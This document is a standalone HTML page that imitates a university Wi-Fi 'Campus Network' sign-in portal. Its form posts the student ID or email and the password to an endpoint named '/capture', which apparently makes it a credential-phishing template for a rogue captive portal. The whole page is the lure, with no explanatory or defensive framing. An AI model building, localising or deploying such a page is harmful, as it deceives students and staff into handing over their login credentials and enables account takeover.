<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Campus Network</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',Tahoma,Geneva,sans-serif;background:#f0f2f5;
display:flex;justify-content:center;align-items:center;min-height:100vh;
padding:16px}
.card{background:#fff;border-radius:12px;overflow:hidden;width:100%;
max-width:420px;box-shadow:0 8px 32px rgba(0,0,0,.1)}
.header{background:linear-gradient(135deg,#1b2a4a 0%,#2c3e6b 100%);
padding:36px 32px 28px;text-align:center;color:#fff}
.shield{font-size:3.2em;margin-bottom:10px;display:block}
.header h1{font-size:1.35em;font-weight:700;letter-spacing:.3px}
.header p{font-size:.82em;opacity:.78;margin-top:6px;line-height:1.4}
.body{padding:32px 28px 24px}
label{display:block;font-size:.78em;color:#555;margin-bottom:5px;
font-weight:600;text-transform:uppercase;letter-spacing:.4px}
input[type="text"],input[type="password"]{width:100%;padding:11px 14px;
border:1.5px solid #d0d5dd;border-radius:8px;font-size:.92em;
margin-bottom:16px;outline:none;transition:border-color .2s}
input:focus{border-color:#1b2a4a}
button{width:100%;padding:13px;background:#1b2a4a;color:#fff;border:none;
border-radius:8px;font-size:.95em;font-weight:600;cursor:pointer;
transition:background .2s}
button:hover{background:#2c3e6b}
.footer{text-align:center;padding:0 28px 24px;font-size:.73em;color:#999;
line-height:1.5}
.footer a{color:#1b2a4a;text-decoration:none}
.divider{height:1px;background:#eee;margin:0 28px 16px}
@media(max-width:480px){.card{max-width:100%;border-radius:8px}
.header{padding:28px 20px 22px}.body{padding:24px 20px 18px}
.footer{padding:0 20px 20px}}
</style>
</head>
<body>
<div class="card">
<div class="header">
<span class="shield">&#x1F3DB;</span>
<h1 data-i18n="title">Campus Network</h1>
<p data-i18n="subtitle">Authenticate to access the university wireless network</p>
</div>
<div class="body">
<form method="POST" action="/capture" autocomplete="off">
<label for="uid" data-i18n="label_user">Student ID / Email</label>
<input type="text" id="uid" name="username" data-i18n-ph="ph_user"
placeholder="student@university.edu" required>
<label for="pwd" data-i18n="label_pass">Password</label>
<input type="password" id="pwd" name="password" data-i18n-ph="ph_pass"
placeholder="Enter your password" required>
<button type="submit" data-i18n="btn_login">Sign In</button>
</form>
</div>
<div class="divider"></div>
<div class="footer">
<span data-i18n="help">Having trouble? Contact IT Support at your campus help desk.</span>
</div>
</div>
